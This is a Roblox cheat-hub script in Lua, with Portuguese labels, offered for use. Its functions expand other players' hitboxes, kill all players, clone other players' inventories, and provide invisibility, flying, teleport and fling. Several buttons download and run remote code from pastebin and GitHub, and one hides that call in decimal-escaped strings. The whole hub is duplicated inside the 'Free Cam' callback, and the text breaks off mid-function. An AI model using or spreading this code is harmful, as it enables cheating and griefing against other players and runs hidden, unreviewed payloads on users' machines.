local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "SYAN XEON | XRX | SYC", HidePremium = false, SaveConfig = false, ConfigFolder = "XRXHUB", IntroEnabled = false})

local Tab = Window:MakeTab({
	Name = "Principal/Player",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Hitbox >>> Expander",
	Callback = function()
      		_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
  	end    
})

Tab:AddButton({
	Name = "Kill >>> Matar todos",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/8MrxeDEw",true))()
  	end    
})

Tab:AddTextbox({
    Name = "Setar vida >>> Alterar a vida",
    Default = "?",
    TextDisappear = true,
    Callback = function(Value)
        local desiredHealth = tonumber(Value)

        if desiredHealth then
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = desiredHealth
        end
    end
})

Tab:AddTextbox({
    Name = "Itens >>> Pegar tudo do inventário do player",
    Default = "?",
    TextDisappear = true,
    Callback = function(playerName)
        local player

        player = game.Players:FindFirstChild(playerName)

        if not player then
            for _, ply in pairs(game.Players:GetPlayers()) do
                if string.sub(ply.Name, 1, #playerName) == playerName then
                    player = ply
                    break
                end
            end
        end

        if player then
            local playerInventory = player.Backpack:GetChildren()

            for _, item in pairs(playerInventory) do
                local itemClone = item:Clone()
                itemClone.Parent = game.Players.LocalPlayer.Backpack
            end
        end
    end
})

Tab:AddButton({
	Name = "Tool >>> Invisibilidade",
	Callback = function()
      		local offset = 1100
local invisible = game.Players.LocalPlayer
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
            player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance
            player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance
        end
    end
end
local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Invisible"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(
    function()
        wait()
        if not invisible then
            invisible = true
            tool.Name = "Enabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            handle = Instance.new("Part", workspace)
            handle.Name = "Handle"
            handle.Transparency = 1
            handle.CanCollide = false
            handle.Size = Vector3.new(2, 1, 1)
            weld = Instance.new("Weld", handle)
            weld.Part0 = handle
            weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
            weld.C0 = CFrame.new(0, offset - 1.5, 0)
            setDisplayDistance(offset + 100)
            workspace.CurrentCamera.CameraSubject = handle
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = offset
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            for _, child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if child:IsA("Tool") and child ~= tool then
                    grips[child] = child.Grip
                end
            end
        elseif invisible then
            invisible = false
            tool.Name = "Disabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            for _, child in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if child:IsA("Tool") then
                    child.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            for tool, grip in pairs(grips) do
                if tool then
                    tool.Grip = grip
                end
            end
            heldTool = nil
            setDisplayDistance(100)
            workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
        end
        tool.Parent = game.Players.LocalPlayer.Backpack
    end
)
game.Players.LocalPlayer.Character.ChildAdded:Connect(
    function(child)
        wait()
        if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
            heldTool = child
            local lastGrip = heldTool.Grip
            if not grips[heldTool] then
                grips[heldTool] = lastGrip
            end
            for _, track in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                track:Stop()
            end
            game.Players.LocalPlayer.Character.Animate.Disabled = true
            heldTool.Grip = heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
            heldTool.Parent = game.Players.LocalPlayer.Backpack
            heldTool.Parent = game.Players.LocalPlayer.Character
            if gripChanged then
                gripChanged:Disconnect()
            end
            gripChanged =
                heldTool:GetPropertyChangedSignal("Grip"):Connect(
                function()
                    wait()
                    if not invisible then
                        gripChanged:Disconnect()
                    end
                    if heldTool.Grip ~= lastGrip then
                        lastGrip =
                            heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                        heldTool.Grip = lastGrip
                        heldTool.Parent = game.Players.LocalPlayer.Backpack
                        heldTool.Parent = game.Players.LocalPlayer.Character
                    end
                end
            )
        end
    end
)
  	end    
})

Tab:AddButton({
	Name = "Fly >>> PC/MOBILE",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
  	end    
})

Tab:AddButton({
	Name = "Click Teleport",
	Callback = function()
        mouse = game.Players.LocalPlayer:GetMouse()
        tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "Click Teleport"
        tool.Activated:connect(function()
        local pos = mouse.Hit+Vector3.new(0,2.5,0)
        pos = CFrame.new(pos.X,pos.Y,pos.Z)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        end)
        tool.Parent = game.Players.LocalPlayer.Backpack
  	end    
})

Tab:AddToggle({
	Name = "God Mode",
	Default = false,
	Callback = function(Value)       
	end    
})

Tab:AddToggle({
	Name = "Free Cam",
	Default = false,
	Callback = function(Value)   
        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
        local Window = OrionLib:MakeWindow({Name = "SYAN XEON | XRX | SYC", HidePremium = false, SaveConfig = false, ConfigFolder = "XRXHUB", IntroEnabled = false})
        
        local Tab = Window:MakeTab({
            Name = "Principal/Player",
            Icon = "rbxassetid://4483345998",
            PremiumOnly = false
        })
        
        Tab:AddButton({
            Name = "Hitbox >>> Expander",
            Callback = function()
                      _G.HeadSize = 20
        _G.Disabled = true
        
        game:GetService('RunService').RenderStepped:connect(function()
        if _G.Disabled then
        for i,v in next, game:GetService('Players'):GetPlayers() do
        if v.Name ~= game:GetService('Players').LocalPlayer.Name then
        pcall(function()
        v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
        v.Character.HumanoidRootPart.Transparency = 0.7
        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
        v.Character.HumanoidRootPart.Material = "Neon"
        v.Character.HumanoidRootPart.CanCollide = false
        end)
        end
        end
        end
        end)
              end    
        })
        
        Tab:AddButton({
            Name = "Kill >>> Matar todos",
            Callback = function()
                      loadstring(game:HttpGet("https://pastebin.com/raw/8MrxeDEw",true))()
              end    
        })
        
        Tab:AddTextbox({
            Name = "Setar vida >>> Alterar a vida",
            Default = "?",
            TextDisappear = true,
            Callback = function(Value)
                local desiredHealth = tonumber(Value)
        
                if desiredHealth then
                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = desiredHealth
                end
            end
        })
        
        Tab:AddTextbox({
            Name = "Itens >>> Pegar tudo do inventário do player",
            Default = "?",
            TextDisappear = true,
            Callback = function(playerName)
                local player
        
                player = game.Players:FindFirstChild(playerName)
        
                if not player then
                    for _, ply in pairs(game.Players:GetPlayers()) do
                        if string.sub(ply.Name, 1, #playerName) == playerName then
                            player = ply
                            break
                        end
                    end
                end
        
                if player then
                    local playerInventory = player.Backpack:GetChildren()
        
                    for _, item in pairs(playerInventory) do
                        local itemClone = item:Clone()
                        itemClone.Parent = game.Players.LocalPlayer.Backpack
                    end
                end
            end
        })
        
        Tab:AddButton({
            Name = "Tool >>> Invisibilidade",
            Callback = function()
                      local offset = 1100
        local invisible = game.Players.LocalPlayer
        local grips = {}
        local heldTool
        local gripChanged
        local handle
        local weld
        function setDisplayDistance(distance)
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
                    player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance
                    player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance
                end
            end
        end
        local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
        tool.Name = "Invisible"
        tool.RequiresHandle = false
        tool.CanBeDropped = false
        tool.Equipped:Connect(
            function()
                wait()
                if not invisible then
                    invisible = true
                    tool.Name = "Enabled Invisible"
                    if handle then
                        handle:Destroy()
                    end
                    if weld then
                        weld:Destroy()
                    end
                    handle = Instance.new("Part", workspace)
                    handle.Name = "Handle"
                    handle.Transparency = 1
                    handle.CanCollide = false
                    handle.Size = Vector3.new(2, 1, 1)
                    weld = Instance.new("Weld", handle)
                    weld.Part0 = handle
                    weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
                    weld.C0 = CFrame.new(0, offset - 1.5, 0)
                    setDisplayDistance(offset + 100)
                    workspace.CurrentCamera.CameraSubject = handle
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
                    game.Players.LocalPlayer.Character.Humanoid.HipHeight = offset
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
                    for _, child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        if child:IsA("Tool") and child ~= tool then
                            grips[child] = child.Grip
                        end
                    end
                elseif invisible then
                    invisible = false
                    tool.Name = "Disabled Invisible"
                    if handle then
                        handle:Destroy()
                    end
                    if weld then
                        weld:Destroy()
                    end
                    for _, child in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if child:IsA("Tool") then
                            child.Parent = game.Players.LocalPlayer.Backpack
                        end
                    end
                    for tool, grip in pairs(grips) do
                        if tool then
                            tool.Grip = grip
                        end
                    end
                    heldTool = nil
                    setDisplayDistance(100)
                    workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
                    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
                end
                tool.Parent = game.Players.LocalPlayer.Backpack
            end
        )
        game.Players.LocalPlayer.Character.ChildAdded:Connect(
            function(child)
                wait()
                if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
                    heldTool = child
                    local lastGrip = heldTool.Grip
                    if not grips[heldTool] then
                        grips[heldTool] = lastGrip
                    end
                    for _, track in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                        track:Stop()
                    end
                    game.Players.LocalPlayer.Character.Animate.Disabled = true
                    heldTool.Grip = heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                    heldTool.Parent = game.Players.LocalPlayer.Backpack
                    heldTool.Parent = game.Players.LocalPlayer.Character
                    if gripChanged then
                        gripChanged:Disconnect()
                    end
                    gripChanged =
                        heldTool:GetPropertyChangedSignal("Grip"):Connect(
                        function()
                            wait()
                            if not invisible then
                                gripChanged:Disconnect()
                            end
                            if heldTool.Grip ~= lastGrip then
                                lastGrip =
                                    heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                                heldTool.Grip = lastGrip
                                heldTool.Parent = game.Players.LocalPlayer.Backpack
                                heldTool.Parent = game.Players.LocalPlayer.Character
                            end
                        end
                    )
                end
            end
        )
              end    
        })
        
        Tab:AddButton({
            Name = "Fly >>> PC/MOBILE",
            Callback = function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
              end    
        })
        
        Tab:AddButton({
            Name = "Click Teleport",
            Callback = function()
                mouse = game.Players.LocalPlayer:GetMouse()
                tool = Instance.new("Tool")
                tool.RequiresHandle = false
                tool.Name = "Click Teleport"
                tool.Activated:connect(function()
                local pos = mouse.Hit+Vector3.new(0,2.5,0)
                pos = CFrame.new(pos.X,pos.Y,pos.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
                end)
                tool.Parent = game.Players.LocalPlayer.Backpack
              end    
        })
        
        Tab:AddToggle({
            Name = "God Mode (Em Desenvolvimento!)",
            Default = false,
            Callback = function(Value)       
            end    
        })

        Tab:AddButton({
            Name = "Fling >>> Carrega no activate para funcionar",
            Callback = function()
                -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn =  false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.358047009, 0, 0.230407521, 0)
Frame.Size = UDim2.new(0, 338, 0, 324)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 338, 0, 51)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Fling  Gui"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 30.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, 0.845678985, 0)
TextLabel_2.Size = UDim2.new(0, 338, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = " Made By - sycx000"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 35.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0886528417, 0, 0.219135806, 0)
TextButton.Size = UDim2.new(0, 279, 0, 182)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Activate!"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 50.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
end)
              end    
        })
        
        
        Tab:AddButton({
            Name = "Free Cam >>> Shift + P Para Funcionar",
            Default = false,
            Callback = function(Value)   
                function sandbox(var,func)
                    local env = getfenv(func)
                    local newenv = setmetatable({},{
                    __index = function(self,k)
                    if k=="script" then
                    return var
                    else
                    return env[k]
                    end
                    end,
                    })
                    setfenv(func,newenv)
                    return func
                    end
                    cors = {}
                    mas = Instance.new("Model",game:GetService("Lighting"))
                    LocalScript0 = Instance.new("LocalScript")
                    LocalScript0.Name = "FreeCamera"
                    LocalScript0.Parent = mas
                    table.insert(cors,sandbox(LocalScript0,function()
                    -----------------------------------------------------------------------
                    -- Freecam
                    -- Cinematic free camera for spectating and video production.
                    ------------------------------------------------------------------------
                     
                    local pi    = math.pi
                    local abs   = math.abs
                    local clamp = math.clamp
                    local exp   = math.exp
                    local rad   = math.rad
                    local sign  = math.sign
                    local sqrt  = math.sqrt
                    local tan   = math.tan
                     
                    local ContextActionService = game:GetService("ContextActionService")
                    local Players = game:GetService("Players")
                    local RunService = game:GetService("RunService")
                    local StarterGui = game:GetService("StarterGui")
                    local UserInputService = game:GetService("UserInputService")
                     
                    local LocalPlayer = Players.LocalPlayer
                    if not LocalPlayer then
                    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
                    LocalPlayer = Players.LocalPlayer
                    end
                     
                    local Camera = workspace.CurrentCamera
                    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
                    local newCamera = workspace.CurrentCamera
                    if newCamera then
                    Camera = newCamera
                    end
                    end)
                     
                    ------------------------------------------------------------------------
                     
                    local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
                    local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
                    local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}
                     
                    local NAV_GAIN = Vector3.new(1, 1, 1)*64
                    local PAN_GAIN = Vector2.new(0.75, 1)*8
                    local FOV_GAIN = 300
                     
                    local PITCH_LIMIT = rad(90)
                     
                    local VEL_STIFFNESS = 1.5
                    local PAN_STIFFNESS = 1.0
                    local FOV_STIFFNESS = 4.0
                     
                    ------------------------------------------------------------------------
                     
                    local Spring = {} do
                    Spring.__index = Spring
                     
                    function Spring.new(freq, pos)
                    local self = setmetatable({}, Spring)
                    self.f = freq
                    self.p = pos
                    self.v = pos*0
                    return self
                    end
                     
                    function Spring:Update(dt, goal)
                    local f = self.f*2*pi
                    local p0 = self.p
                    local v0 = self.v
                     
                    local offset = goal - p0
                    local decay = exp(-f*dt)
                     
                    local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
                    local v1 = (f*dt*(offset*f - v0) + v0)*decay
                     
                    self.p = p1
                    self.v = v1
                     
                    return p1
                    end
                     
                    function Spring:Reset(pos)
                    self.p = pos
                    self.v = pos*0
                    end
                    end
                     
                    ------------------------------------------------------------------------
                     
                    local cameraPos = Vector3.new()
                    local cameraRot = Vector2.new()
                    local cameraFov = 0
                     
                    local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
                    local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
                    local fovSpring = Spring.new(FOV_STIFFNESS, 0)
                     
                    ------------------------------------------------------------------------
                     
                    local Input = {} do
                    local thumbstickCurve do
                    local K_CURVATURE = 2.0
                    local K_DEADZONE = 0.15
                     
                    local function fCurve(x)
                    return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
                    end
                     
                    local function fDeadzone(x)
                    return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
                    end
                     
                    function thumbstickCurve(x)
                    return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
                    end
                    end
                     
                    local gamepad = {
                    ButtonX = 0,
                    ButtonY = 0,
                    DPadDown = 0,
                    DPadUp = 0,
                    ButtonL2 = 0,
                    ButtonR2 = 0,
                    Thumbstick1 = Vector2.new(),
                    Thumbstick2 = Vector2.new(),
                    }
                     
                    local keyboard = {
                    W = 0,
                    A = 0,
                    S = 0,
                    D = 0,
                    E = 0,
                    Q = 0,
                    U = 0,
                    H = 0,
                    J = 0,
                    K = 0,
                    I = 0,
                    Y = 0,
                    Up = 0,
                    Down = 0,
                    LeftShift = 0,
                    RightShift = 0,
                    }
                     
                    local mouse = {
                    Delta = Vector2.new(),
                    MouseWheel = 0,
                    }
                     
                    local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
                    local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
                    local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
                    local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
                    local FOV_WHEEL_SPEED    = 1.0
                    local FOV_GAMEPAD_SPEED  = 0.25
                    local NAV_ADJ_SPEED      = 0.75
                    local NAV_SHIFT_MUL      = 0.25
                     
                    local navSpeed = 1
                     
                    function Input.Vel(dt)
                    navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)
                     
                    local kGamepad = Vector3.new(
                    thumbstickCurve(gamepad.Thumbstick1.x),
                    thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
                    thumbstickCurve(-gamepad.Thumbstick1.y)
                    )*NAV_GAMEPAD_SPEED
                     
                    local kKeyboard = Vector3.new(
                    keyboard.D - keyboard.A + keyboard.K - keyboard.H,
                    keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
                    keyboard.S - keyboard.W + keyboard.J - keyboard.U
                    )*NAV_KEYBOARD_SPEED
                     
                    local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)
                     
                    return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
                    end
                     
                    function Input.Pan(dt)
                    local kGamepad = Vector2.new(
                    thumbstickCurve(gamepad.Thumbstick2.y),
                    thumbstickCurve(-gamepad.Thumbstick2.x)
                    )*PAN_GAMEPAD_SPEED
                    local kMouse = mouse.Delta*PAN_MOUSE_SPEED
                    mouse.Delta = Vector2.new()
                    return kGamepad + kMouse
                    end
                     
                    function Input.Fov(dt)
                    local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
                    local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
                    mouse.MouseWheel = 0
                    return kGamepad + kMouse
                    end
                     
                    do
                    local function Keypress(action, state, input)
                    keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function GpButton(action, state, input)
                    gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function MousePan(action, state, input)
                    local delta = input.Delta
                    mouse.Delta = Vector2.new(-delta.y, -delta.x)
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function Thumb(action, state, input)
                    gamepad[input.KeyCode.Name] = input.Position
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function Trigger(action, state, input)
                    gamepad[input.KeyCode.Name] = input.Position.z
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function MouseWheel(action, state, input)
                    mouse[input.UserInputType.Name] = -input.Position.z
                    return Enum.ContextActionResult.Sink
                    end
                     
                    local function Zero(t)
                    for k, v in pairs(t) do
                    t[k] = v*0
                    end
                    end
                     
                    function Input.StartCapture()
                    ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
                    Enum.KeyCode.W, Enum.KeyCode.U,
                    Enum.KeyCode.A, Enum.KeyCode.H,
                    Enum.KeyCode.S, Enum.KeyCode.J,
                    Enum.KeyCode.D, Enum.KeyCode.K,
                    Enum.KeyCode.E, Enum.KeyCode.I,
                    Enum.KeyCode.Q, Enum.KeyCode.Y,
                    Enum.KeyCode.Up, Enum.KeyCode.Down
                    )
                    ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
                    ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
                    ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
                    ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
                    ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
                    end
                     
                    function Input.StopCapture()
                    navSpeed = 1
                    Zero(gamepad)
                    Zero(keyboard)
                    Zero(mouse)
                    ContextActionService:UnbindAction("FreecamKeyboard")
                    ContextActionService:UnbindAction("FreecamMousePan")
                    ContextActionService:UnbindAction("FreecamMouseWheel")
                    ContextActionService:UnbindAction("FreecamGamepadButton")
                    ContextActionService:UnbindAction("FreecamGamepadTrigger")
                    ContextActionService:UnbindAction("FreecamGamepadThumbstick")
                    end
                    end
                    end
                     
                    local function GetFocusDistance(cameraFrame)
                    local znear = 0.1
                    local viewport = Camera.ViewportSize
                    local projy = 2*tan(cameraFov/2)
                    local projx = viewport.x/viewport.y*projy
                    local fx = cameraFrame.rightVector
                    local fy = cameraFrame.upVector
                    local fz = cameraFrame.lookVector
                     
                    local minVect = Vector3.new()
                    local minDist = 512
                     
                    for x = 0, 1, 0.5 do
                    for y = 0, 1, 0.5 do
                    local cx = (x - 0.5)*projx
                    local cy = (y - 0.5)*projy
                    local offset = fx*cx - fy*cy + fz
                    local origin = cameraFrame.p + offset*znear
                    local part, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
                    local dist = (hit - origin).magnitude
                    if minDist > dist then
                    minDist = dist
                    minVect = offset.unit
                    end
                    end
                    end
                     
                    return fz:Dot(minVect)*minDist
                    end
                     
                    ------------------------------------------------------------------------
                     
                    local function StepFreecam(dt)
                    local vel = velSpring:Update(dt, Input.Vel(dt))
                    local pan = panSpring:Update(dt, Input.Pan(dt))
                    local fov = fovSpring:Update(dt, Input.Fov(dt))
                     
                    local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))
                     
                    cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120) 
                    cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
                    cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))
                     
                    local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
                    cameraPos = cameraCFrame.p
                     
                    Camera.CFrame = cameraCFrame
                    Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
                    Camera.FieldOfView = cameraFov
                    end
                     
                    ------------------------------------------------------------------------
                     
                    local PlayerState = {} do
                    local mouseIconEnabled
                    local cameraSubject
                    local cameraType
                    local cameraFocus
                    local cameraCFrame
                    local cameraFieldOfView
                    local screenGuis = {}
                    local coreGuis = {
                    Backpack = true,
                    Chat = true,
                    Health = true,
                    PlayerList = true,
                    }
                    local setCores = {
                    BadgesNotificationsActive = true,
                    PointsNotificationsActive = true,
                    }
                     
                    -- Save state and set up for freecam
                    function PlayerState.Push()
                    for name in pairs(coreGuis) do
                    coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
                    end
                    for name in pairs(setCores) do
                    setCores[name] = StarterGui:GetCore(name)
                    StarterGui:SetCore(name, false)
                    end
                    local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
                    if playergui then
                    for _, gui in pairs(playergui:GetChildren()) do
                    if gui:IsA("ScreenGui") and gui.Enabled then
                    screenGuis[#screenGuis + 1] = gui
